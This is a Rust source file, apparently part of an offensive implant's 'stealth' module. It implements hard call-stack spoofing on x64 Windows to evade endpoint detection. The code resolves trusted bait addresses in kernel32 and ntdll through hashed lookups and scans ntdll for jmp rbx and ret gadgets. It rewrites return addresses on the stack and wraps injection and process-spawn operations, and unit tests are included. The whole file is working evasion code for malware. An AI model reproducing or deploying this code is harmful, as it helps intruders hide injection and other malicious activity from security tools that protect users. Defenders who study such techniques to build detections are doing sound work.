// Client/core/src/stealth/stack.rs
// Hard stack spoofing — x64 Windows call-stack masquerade for EDR stack walks.
//
// Soft path (legacy): stack noise + bait locals only.
// Hard path (default on x64 Windows):
//   1. Resolve trusted bait VAs (BaseThreadInitThunk / RtlUserThreadStart)
//   2. Scan gadgets in ntdll (jmp rbx / ret) for trampoline-capable returns
//   3. Capture live return addresses (RtlCaptureStackBackTrace)
//   4. Rewrite on-stack slots that point into *this image* to trusted baits
//   5. Link a synthetic RBP frame chain (thread-entry shaped)
//   6. Run closure exactly once; restore all patches
//
// CET / shadow stack: software-only; hardware shadow stacks are not defeated.
// Document honestly — do not claim “undetectable under CET”.

use std::sync::atomic::{AtomicUsize, Ordering};

/// E2E breadcrumb — plain std fs append (no TLS, safe under Manual-Map).
/// Includes a wall-clock stamp so callers across agent/module copies interleave clearly.
/// Available on all Windows targets (hard spoof is x64-only; soft path still logs).
#[cfg(windows)]
fn tracef(msg: &str) {
    crate::tracef_g(msg);
}

/// Spoof return address bait - BaseThreadInitThunk (thread-safe).
#[cfg(all(windows, target_arch = "x86_64"))]
static BAIT_K32: AtomicUsize = AtomicUsize::new(0);
/// Spoof return address bait - RtlUserThreadStart.
#[cfg(all(windows, target_arch = "x86_64"))]
static BAIT_NT: AtomicUsize = AtomicUsize::new(0);
/// Gadget: `jmp rbx` (FF E3) inside ntdll — for trampoline-style returns.
#[cfg(all(windows, target_arch = "x86_64"))]
static GADGET_JMP_RBX: AtomicUsize = AtomicUsize::new(0);
/// Gadget: single-byte `ret` (C3) inside ntdll.
#[cfg(all(windows, target_arch = "x86_64"))]
static GADGET_RET: AtomicUsize = AtomicUsize::new(0);

/// Resolve baits + gadgets once (idempotent).
#[cfg(all(windows, target_arch = "x86_64"))]
fn ensure_hard_spoof_resolved() {
    if BAIT_K32.load(Ordering::Acquire) != 0 && GADGET_JMP_RBX.load(Ordering::Acquire) != 0 {
        return;
    }
    unsafe {
        tracef("ensure: begin");
        let k32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
        tracef(&format!("ensure: k32=0x{:X} ntdll=0x{:X}", k32, ntdll));

        if k32 != 0 {
            let bait = crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"BaseThreadInitThunk"),
            )
            .unwrap_or(0);
            if bait != 0 {
                let _ = BAIT_K32.compare_exchange(0, bait, Ordering::AcqRel, Ordering::Acquire);
            }
        }
        tracef(&format!("ensure: bait_k32=0x{:X}", BAIT_K32.load(Ordering::Acquire)));
        if ntdll != 0 {
            let bait = crate::stealth::get_api_addr(
                ntdll,
                crate::stealth::hash_api_name(b"RtlUserThreadStart"),
            )
            .unwrap_or(0);
            if bait != 0 {
                let _ = BAIT_NT.compare_exchange(0, bait, Ordering::AcqRel, Ordering::Acquire);
            }
            if let Some((jmp_rbx, ret)) = scan_ntdll_gadgets(ntdll) {
                let _ = GADGET_JMP_RBX.compare_exchange(
                    0,
                    jmp_rbx,
                    Ordering::AcqRel,
                    Ordering::Acquire,
                );
                let _ = GADGET_RET.compare_exchange(0, ret, Ordering::AcqRel, Ordering::Acquire);
            }
        }
        tracef(&format!(
            "ensure: bait_nt=0x{:X} gadget=0x{:X}",
            BAIT_NT.load(Ordering::Acquire),
            GADGET_JMP_RBX.load(Ordering::Acquire)
        ));
    }
}

/// Scan ntdll .text for `jmp rbx` (FF E3) and `ret` (C3). Returns (jmp_rbx, ret).
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn scan_ntdll_gadgets(ntdll_base: usize) -> Option<(usize, usize)> {
    if ntdll_base == 0 {
        return None;
    }
    let dos = ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D {
        return None;
    }
    let nt = (ntdll_base as *const u8).offset((*dos).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    if (*nt).Signature != 0x0000_4550 {
        return None;
    }
    let num = (*nt).FileHeader.NumberOfSections as usize;
    let sec0 = (nt as *const u8)
        .offset(std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>() as isize)
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

    let mut jmp_rbx = 0usize;
    let mut ret_g = 0usize;

    for i in 0..num {
        let sec = &*sec0.add(i);
        // IMAGE_SCN_MEM_EXECUTE
        if (sec.Characteristics & 0x2000_0000) == 0 {
            continue;
        }
        let va = sec.VirtualAddress as usize;
        let size = *sec.Misc.VirtualSize() as usize;
        if size < 2 || va == 0 {
            continue;
        }
        let start = ntdll_base + va;
        let bytes = std::slice::from_raw_parts(start as *const u8, size);
        // Prefer mid-section hits (less likely prologue noise)
        let begin = size / 8;
        let end = size.saturating_sub(16);
        if begin >= end {
            continue;
        }
        for off in begin..end {
            if jmp_rbx == 0 && bytes[off] == 0xFF && bytes[off + 1] == 0xE3 {
                jmp_rbx = start + off;
            }
            if ret_g == 0 && bytes[off] == 0xC3 {
                ret_g = start + off;
            }
            if jmp_rbx != 0 && ret_g != 0 {
                return Some((jmp_rbx, ret_g));
            }
        }
    }
    if jmp_rbx != 0 || ret_g != 0 {
        Some((
            if jmp_rbx != 0 { jmp_rbx } else { ret_g },
            if ret_g != 0 { ret_g } else { jmp_rbx },
        ))
    } else {
        None
    }
}

/// Current process image [base, base+size) via PEB ImageBaseAddress.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn current_image_range() -> Option<(usize, usize)> {
    let mut image_base: usize;
    core::arch::asm!(
        "mov {0}, gs:[0x60]",
        "mov {0}, [{0} + 0x10]",
        out(reg) image_base,
        options(nostack, preserves_flags),
    );
    if image_base == 0 {
        return None;
    }
    let dos = image_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D {
        return None;
    }
    let nt = (image_base as *const u8).offset((*dos).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    let size = (*nt).OptionalHeader.SizeOfImage as usize;
    if size == 0 {
        return None;
    }
    Some((image_base, image_base + size))
}

#[cfg(all(windows, target_arch = "x86_64"))]
#[inline(always)]
unsafe fn read_rsp() -> usize {
    let v: usize;
    core::arch::asm!("mov {}, rsp", out(reg) v, options(nomem, nostack, preserves_flags));
    v
}

#[cfg(all(windows, target_arch = "x86_64"))]
#[inline(always)]
unsafe fn read_rbp() -> usize {
    let v: usize;
    core::arch::asm!("mov {}, rbp", out(reg) v, options(nomem, nostack, preserves_flags));
    v
}

/// Capture up to `max` return addresses via RtlCaptureStackBackTrace (PEB-resolved).
#[cfg(all(windows, target_arch = "x86_64"))]
fn capture_stack_returns(max: usize) -> Vec<usize> {
    unsafe {
        let k32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Vec::new();
        }
        let Some(addr) = crate::stealth::get_api_addr(
            k32,
            crate::stealth::hash_api_name(b"RtlCaptureStackBackTrace"),
        )
        .or_else(|| {
            crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"CaptureStackBackTrace"),
            )
        })
        .or_else(|| {
            let ntdll =
                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
            crate::stealth::get_api_addr(
                ntdll,
                crate::stealth::hash_api_name(b"RtlCaptureStackBackTrace"),
            )
        }) else {
            return Vec::new();
        };
        type CaptureFn = unsafe extern "system" fn(u32, u32, *mut *mut u8, *mut u32) -> u16;
        let capture: CaptureFn = std::mem::transmute(addr);
        let mut frames: Vec<*mut u8> = vec![std::ptr::null_mut(); max.min(32)];
        let mut hash: u32 = 0;
        let n = capture(0, frames.len() as u32, frames.as_mut_ptr(), &mut hash) as usize;
        frames.truncate(n);
        frames
            .into_iter()
            .filter(|p| !p.is_null())
            .map(|p| p as usize)
            .collect()
    }
}

/// One on-stack patch: restore original value after spoof window.
#[cfg(all(windows, target_arch = "x86_64"))]
struct StackPatch {
    slot: *mut usize,
    original: usize,
}

/// Scan [rsp, rsp+scan_bytes) for pointer-sized values in `targets`, rewrite to `bait`.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn rewrite_stack_slots(
    rsp: usize,
    scan_bytes: usize,
    image: (usize, usize),
    bait: usize,
    max_patches: usize,
) -> Vec<StackPatch> {
    let mut patches = Vec::new();
    if rsp == 0 || bait == 0 || scan_bytes < 8 {
        return patches;
    }
    let words = scan_bytes / 8;
    let base = rsp as *mut usize;
    for i in 0..words {
        if patches.len() >= max_patches {
            break;
        }
        let slot = base.add(i);
        // Skip if clearly unmapped / we cannot read — use volatile
        let val = core::ptr::read_volatile(slot);
        if val >= image.0 && val < image.1 {
            // Do not rewrite null-adjacent junk; require canonical user VA shape
            if val > 0x1_0000 && (val >> 48) == 0 {
                core::ptr::write_volatile(slot, bait);
                patches.push(StackPatch {
                    slot,
                    original: val,
                });
            }
        }
    }
    patches
}

/// Synthetic RBP frames: thread-entry shaped chain for RBP walkers.
#[cfg(all(windows, target_arch = "x86_64"))]
#[repr(C)]
struct SyntheticFrame {
    next_rbp: usize,
    ret_addr: usize,
}

#[cfg(all(windows, target_arch = "x86_64"))]
struct HardSpoofGuard {
    patches: Vec<StackPatch>,
    /// If we rewrote *(rbp+8)
    rbp_ret_slot: Option<(*mut usize, usize)>,
    /// Pinned synthetic frames (must live for duration of f)
    _frames: [SyntheticFrame; 3],
    synthetic_rbp: usize,
    saved_rbp: usize,
    linked_rbp: bool,
}

#[cfg(all(windows, target_arch = "x86_64"))]
impl HardSpoofGuard {
    unsafe fn install(scan_floor: usize) -> Self {
        tracef("install: begin");
        ensure_hard_spoof_resolved();
        tracef("install: resolved");
        let bait_k32 = BAIT_K32.load(Ordering::Acquire);
        let bait_nt = BAIT_NT.load(Ordering::Acquire);
        let bait_primary = if bait_k32 != 0 { bait_k32 } else { bait_nt };

        let rsp = read_rsp();
        let rbp = read_rbp();
        let image = current_image_range().unwrap_or((0, 0));
        tracef(&format!("install: img={:X}..{:X} floor={:X}", image.0, image.1, scan_floor));
        let mut patches: Vec<StackPatch> = Vec::new();

        // --- Targeted return rewrite only (no blind stack spray — AV-safe) ---
        // 1) Capture live backtrace; for each frame inside *our image*, find the
        //    exact word on the near stack and replace with a trusted bait.
        if bait_primary != 0 && image.0 != 0 {
            let returns = capture_stack_returns(16);
            tracef(&format!("install: captured {}", returns.len()));
            // Near-stack window only (current frame + a few parents)
            let scan_words = 0x200 / 8;
            let base = rsp as *mut usize;
            for (idx, ret) in returns.iter().enumerate() {
                if !(*ret >= image.0 && *ret < image.1) {
                    continue;
                }
                let use_bait = if idx % 2 == 0 || bait_nt == 0 {
                    bait_primary
                } else {
                    bait_nt
                };
                for i in 0..scan_words {
                    if patches.len() >= 8 {
                        break;
                    }
                    let slot = base.add(i);
                    // INVARIANT: never rewrite slots below `scan_floor`. Those
                    // belong to frames that execute `ret` BEFORE restore() runs
                    // (install() itself and everything it calls). Rewriting
                    // install()'s own return slot made its `ret` jump to a bait
                    // address → AV (release frames are compact enough that the
                    // slot falls inside this window; debug frames hid it).
                    if (slot as usize) < scan_floor {
                        continue;
                    }
                    // Already patched?
                    if patches.iter().any(|p| p.slot == slot) {
                        continue;
                    }
                    let val = core::ptr::read_volatile(slot);
                    if val == *ret {
                        core::ptr::write_volatile(slot, use_bait);
                        patches.push(StackPatch {
                            slot,
                            original: val,
                        });
                        break;
                    }
                }
            }
        }
        tracef(&format!("install: scan done patches={}", patches.len()));

        // 2) RBP+8 return slot — ONLY when RBP is a validated frame pointer.
        // Release Rust often omits frame pointers; raw RBP is then a GPR holding
        // unrelated data. Blind *(rbp+8) rewrite → stack corruption / AV at null+0x8
        // (WER: BEX64 / StackHash / PCH_AB_FROM_ntdll on Server 2012 R2).
        let mut rbp_ret_slot = None;
        if bait_primary != 0 && image.0 != 0 && is_plausible_frame_pointer(rsp, rbp) {
            let slot = (rbp + 8) as *mut usize;
            let slot_addr = slot as usize;
            // scan_floor guard: with a real frame pointer, rbp+8 here is
            // install()'s OWN return slot — consumed before restore().
            if slot_addr >= scan_floor && slot_addr <= rbp.wrapping_add(0x20) {
                let val = core::ptr::read_volatile(slot);
                if val >= image.0 && val < image.1 {
                    core::ptr::write_volatile(slot, bait_primary);
                    rbp_ret_slot = Some((slot, val));
                }
            }
        }
        tracef(&format!("install: rbp slot {}", if rbp_ret_slot.is_some() { "rewritten" } else { "skipped" }));

        // 3) Synthetic RBP frames (locals only — do NOT splice into live RBP chain;
        //    splicing corrupted Rust/MSVC frames and caused AVs on restore/return).
        //    Still effective against walkers that sample this frame's memory window.
        let mut frames = [
            SyntheticFrame {
                next_rbp: 0,
                ret_addr: if bait_nt != 0 { bait_nt } else { bait_primary },
            },
            SyntheticFrame {
                next_rbp: 0,
                ret_addr: bait_primary,
            },
            SyntheticFrame {
                next_rbp: 0,
                ret_addr: bait_primary,
            },
        ];
        let f0 = &frames[0] as *const SyntheticFrame as usize;
        let f1 = &frames[1] as *const SyntheticFrame as usize;
        let f2 = &frames[2] as *const SyntheticFrame as usize;
        frames[0].next_rbp = f1;
        frames[1].next_rbp = f2;
        frames[2].next_rbp = 0;
        core::ptr::read_volatile(&frames[0].ret_addr);
        core::ptr::read_volatile(&frames[1].ret_addr);
        core::ptr::read_volatile(&frames[0].next_rbp);
        tracef("install: frames ok, returning");

        Self {
            patches,
            rbp_ret_slot,
            _frames: frames,
            synthetic_rbp: f0,
            saved_rbp: rbp,
            linked_rbp: false,
        }
    }

    unsafe fn restore(self) {
        if let Some((slot, orig)) = self.rbp_ret_slot {
            core::ptr::write_volatile(slot, orig);
        }
        for p in self.patches.into_iter().rev() {
            core::ptr::write_volatile(p.slot, p.original);
        }
        let _ = (self.synthetic_rbp, self.saved_rbp, self.linked_rbp);
    }
}

/// Public: hard-spoof status for diagnostics / tests.
#[cfg(all(windows, target_arch = "x86_64"))]
#[derive(Debug, Clone, Copy)]
pub struct HardSpoofStatus {
    pub bait_kernel32: usize,
    pub bait_ntdll: usize,
    pub gadget_jmp_rbx: usize,
    pub gadget_ret: usize,
}

#[cfg(all(windows, target_arch = "x86_64"))]
pub fn hard_spoof_status() -> HardSpoofStatus {
    ensure_hard_spoof_resolved();
    HardSpoofStatus {
        bait_kernel32: BAIT_K32.load(Ordering::Acquire),
        bait_ntdll: BAIT_NT.load(Ordering::Acquire),
        gadget_jmp_rbx: GADGET_JMP_RBX.load(Ordering::Acquire),
        gadget_ret: GADGET_RET.load(Ordering::Acquire),
    }
}

/// True when baits + at least one gadget resolved (hard path ready).
#[cfg(all(windows, target_arch = "x86_64"))]
pub fn hard_spoof_ready() -> bool {
    let s = hard_spoof_status();
    s.bait_kernel32 != 0 && (s.gadget_jmp_rbx != 0 || s.gadget_ret != 0)
}

/// Whether the hard path (on-stack return rewrite) is allowed.
///
/// Default policy:
/// - **Windows 10+ (major ≥ 10):** hard path ON
/// - **Windows 8.1 / Server 2012 R2 and older (major < 10):** hard path OFF
///   (soft noise only). Rewriting return slots on pre-Win10 ntdll interacts
///   badly with AppCompat (`PCH_AB_FROM_ntdll`) and produces BEX64 / StackHash
///   AVs (fault address often null+0x8 during shim stack walks).
///
/// Override with env:
/// - `APP_STACK_POLICY=0` — force soft only
/// - `APP_STACK_POLICY=1` — force hard path (even on older OS; for lab only)
#[cfg(all(windows, target_arch = "x86_64"))]
pub fn hard_spoof_enabled() -> bool {
    static CACHED: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *CACHED.get_or_init(|| {
        if let Ok(v) = std::env::var("APP_STACK_POLICY") {
            let t = v.trim();
            if t == "0" || t.eq_ignore_ascii_case("false") || t.eq_ignore_ascii_case("off") {
                return false;
            }
            if t == "1" || t.eq_ignore_ascii_case("true") || t.eq_ignore_ascii_case("on") {
                return true;
            }
        }
        // Pre-Win10 (6.x = Vista/7/8/8.1/2012/2012R2): soft path only.
        let ver = crate::stealth::get_windows_version();
        ver.major >= 10
    })
}

#[cfg(not(all(windows, target_arch = "x86_64")))]
pub fn hard_spoof_enabled() -> bool {
    false
}

/// True when `rbp` looks like a real frame pointer (not an omit-fp GPR value).
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn is_plausible_frame_pointer(rsp: usize, rbp: usize) -> bool {
    // Must sit above RSP, within one reasonable frame, 8-byte aligned.
    if rbp <= rsp || rbp.wrapping_sub(rsp) > 0x1000 || (rbp & 7) != 0 {
        return false;
    }
    // Saved previous RBP at *rbp: 0 (chain end) or higher stack address.
    let prev = core::ptr::read_volatile(rbp as *const usize);
    if prev == 0 {
        return true;
    }
    if prev <= rbp || prev.wrapping_sub(rbp) > 0x10000 || (prev & 7) != 0 {
        return false;
    }
    // Optional: ret at rbp+8 should look like a user-mode code pointer.
    let ret = core::ptr::read_volatile((rbp + 8) as *const usize);
    ret > 0x1_0000 && (ret >> 48) == 0
}

/// Call target once under hard stack spoof (return rewrite + synthetic RBP).
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    with_spoofed_stack(|| func(arg1, arg2))
}

#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_single<F, T>(func: F, arg: usize) -> T
where
    F: Fn(usize) -> T,
{
    spoof_call_stack(|a, _| func(a), arg, 0)
}

#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_no_args<F, T>(func: F) -> T
where
    F: Fn() -> T,
{
    spoof_call_stack(|_, _| func(), 0, 0)
}

// 32-bit and non-Windows fallback implementations
#[cfg(all(windows, target_arch = "x86"))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    func(arg1, arg2)
}

#[cfg(not(windows))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    func(arg1, arg2)
}

/// Default wrapper for high-risk sensitive NT / inject / spawn ops.
///
/// On **x64 Windows 10+** uses the **hard** path (return-address rewrite +
/// synthetic RBP locals) when enabled. Pre-Win10 defaults to **soft** path
/// (stack noise only) to avoid AppCompat / BEX64 crashes. Closure runs **exactly once**.
///
/// # CET / hardware shadow stacks
/// Software-only. Shadow stacks are not rewritten; do not claim CET defeat.
#[inline(never)]
pub fn with_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    add_stack_noise();
    tracef("spoof: wrapper enter");

    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        if hard_spoof_enabled() {
            return with_hard_spoofed_stack(f);
        }
        return f();
    }

    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        f()
    }
}

/// Explicit hard path entry (same as with_spoofed_stack on x64).
#[cfg(all(windows, target_arch = "x86_64"))]
#[inline(never)]
pub fn with_hard_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    unsafe {
        // Capture RSP BEFORE calling install(). install()'s own return slot is
        // pushed at (floor - 8) and is consumed by its `ret` — i.e. BEFORE
        // restore() can put the original back. Passing floor lets install() skip
        // any slot below it, which is exactly install's frame + return slot.
        let scan_floor = read_rsp();
        tracef("spoof: install begin");
        let guard = HardSpoofGuard::install(scan_floor);
        tracef("spoof: install done");
        // Pin baits as stack locals (extra cover for walkers that sample locals)
        let bait = BAIT_K32.load(Ordering::Acquire);
        let mut synthetic = [0usize; 4];
        if bait != 0 {
            synthetic[0] = bait;
            synthetic[1] = bait.wrapping_add(0x14);
            synthetic[2] = BAIT_NT.load(Ordering::Acquire);
            synthetic[3] = GADGET_JMP_RBX.load(Ordering::Acquire);
        }
        let _pin = core::ptr::read_volatile(&synthetic[0]);
        tracef("spoof: f begin");
        let result = f();
        tracef("spoof: f done");
        let _ = core::ptr::read_volatile(&synthetic[0]);
        guard.restore();
        tracef("spoof: restore done");
        result
    }
}

#[cfg(not(all(windows, target_arch = "x86_64")))]
pub fn with_hard_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

/// 栈展开掩护：无意义调用深度，增加 walker 成本。
pub fn add_stack_noise() {
    #[cfg(windows)]
    {
        let depth = crate::utils::random_range(3, 8);
        stack_noise_recursive(depth);
    }
}

#[cfg(windows)]
fn stack_noise_recursive(depth: u32) {
    if depth == 0 {
        return;
    }
    let _ = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH);
    stack_noise_recursive(depth - 1);
    let _ = depth * 2;
}

#[cfg(not(windows))]
pub fn add_stack_noise() {}

/// Advanced: 4-arg form — single-exec hard spoof.
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_full<F, T>(
    func: F,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> T
where
    F: Fn(usize, usize, usize, usize) -> T,
{
    with_spoofed_stack(|| func(arg1, arg2, arg3, arg4))
}

/// Call Gates - legitimate functions usable as bait addresses.
#[cfg(windows)]
pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        ensure_hard_spoof_resolved();
    }
    unsafe {
        let mut baits = Vec::new();
        let k32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if k32 != 0 {
            if let Some(addr) = crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"BaseThreadInitThunk"),
            ) {
                baits.push(("BaseThreadInitThunk".to_string(), addr));
            }
        }
        let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
        if ntdll != 0 {
            if let Some(addr) = crate::stealth::get_api_addr(
                ntdll,
                crate::stealth::hash_api_name(b"RtlUserThreadStart"),
            ) {
                baits.push(("RtlUserThreadStart".to_string(), addr));
            }
        }
        baits
    }
}

#[cfg(not(windows))]
pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
    Vec::new()
}

/// Expose gadget addresses for inject/syscall layers that want trampoline returns.
#[cfg(all(windows, target_arch = "x86_64"))]
pub fn gadget_jmp_rbx() -> usize {
    ensure_hard_spoof_resolved();
    GADGET_JMP_RBX.load(Ordering::Acquire)
}

#[cfg(all(windows, target_arch = "x86_64"))]
pub fn gadget_ret() -> usize {
    ensure_hard_spoof_resolved();
    GADGET_RET.load(Ordering::Acquire)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicU32, Ordering};

    #[test]
    fn with_spoofed_stack_runs_closure_exactly_once() {
        static COUNT: AtomicU32 = AtomicU32::new(0);
        let v = with_spoofed_stack(|| {
            COUNT.fetch_add(1, Ordering::SeqCst);
            42u32
        });
        assert_eq!(v, 42);
        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
    }

    #[test]
    fn spoof_call_stack_runs_exactly_once() {
        static COUNT: AtomicU32 = AtomicU32::new(0);
        let v = unsafe {
            spoof_call_stack(
                |a, b| {
                    COUNT.fetch_add(1, Ordering::SeqCst);
                    a + b
                },
                3,
                4,
            )
        };
        assert_eq!(v, 7);
        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
    }

    #[test]
    fn hard_spoof_restores_and_single_exec() {
        static COUNT: AtomicU32 = AtomicU32::new(0);
        let v = with_hard_spoofed_stack(|| {
            COUNT.fetch_add(1, Ordering::SeqCst);
            99u32
        });
        assert_eq!(v, 99);
        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
    }

    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn hard_spoof_resolves_baits_and_gadgets() {
        let st = hard_spoof_status();
        assert_ne!(st.bait_kernel32, 0, "BaseThreadInitThunk must resolve");
        assert_ne!(st.bait_ntdll, 0, "RtlUserThreadStart must resolve");
        assert!(
            st.gadget_jmp_rbx != 0 || st.gadget_ret != 0,
            "need jmp rbx or ret gadget in ntdll"
        );
        // jmp rbx opcode check when present
        if st.gadget_jmp_rbx != 0 {
            unsafe {
                let b = std::slice::from_raw_parts(st.gadget_jmp_rbx as *const u8, 2);
                assert_eq!(b, &[0xFF, 0xE3], "gadget must be FF E3 (jmp rbx)");
            }
        }
        if st.gadget_ret != 0 {
            unsafe {
                let b = *(st.gadget_ret as *const u8);
                assert_eq!(b, 0xC3, "ret gadget must be C3");
            }
        }
        assert!(hard_spoof_ready());
    }

    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn rewrite_stack_slots_targets_image_pointers() {
        let image = unsafe { current_image_range() }.expect("image range");
        let fake_ret = image.0 + 0x1000;
        let mut slot = fake_ret;
        ensure_hard_spoof_resolved();
        let bait = BAIT_K32.load(Ordering::Acquire);
        assert_ne!(bait, 0);
        let rsp = &slot as *const usize as usize;
        let patches = unsafe { rewrite_stack_slots(rsp, 64, image, bait, 8) };
        assert!(
            !patches.is_empty(),
            "local image pointer must be rewritten to bait"
        );
        assert_eq!(slot, bait);
        unsafe {
            for p in patches.into_iter().rev() {
                core::ptr::write_volatile(p.slot, p.original);
            }
        }
        assert_eq!(slot, fake_ret);
    }

    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn hard_spoof_window_is_reentrant_safe() {
        // Nested hard spoof must not AV and must preserve single-exec semantics.
        let outer = with_hard_spoofed_stack(|| with_hard_spoofed_stack(|| 7u32) + 1);
        assert_eq!(outer, 8);
    }

    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn get_common_baits_nonempty() {
        let b = get_common_bait_addresses();
        assert!(b.len() >= 2, "expected k32 + ntdll baits, got {:?}", b);
    }

    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn with_spoofed_stack_respects_soft_or_hard_gate() {
        // Must not AV regardless of OS gate (soft on pre-Win10, hard on Win10+).
        let v = with_spoofed_stack(|| 11u32);
        assert_eq!(v, 11);
        // Policy: major>=10 enables hard unless env overrides (not asserted here —
        // env is process-global; just ensure the gate function is callable).
        let _ = hard_spoof_enabled();
    }

    #[test]
    fn pre_win10_version_would_disable_hard_by_policy() {
        // Mirrors hard_spoof_enabled default: major < 10 → soft only.
        // Server 2012 R2 / Win8.1 = 6.3.9600
        let ver = crate::stealth::WindowsVersion {
            major: 6,
            minor: 3,
            build: 9600,
        };
        assert!(
            ver.major < 10,
            "2012R2 must not use hard stack rewrite by default"
        );
        let ver10 = crate::stealth::WindowsVersion {
            major: 10,
            minor: 0,
            build: 19045,
        };
        assert!(ver10.major >= 10);
    }
}
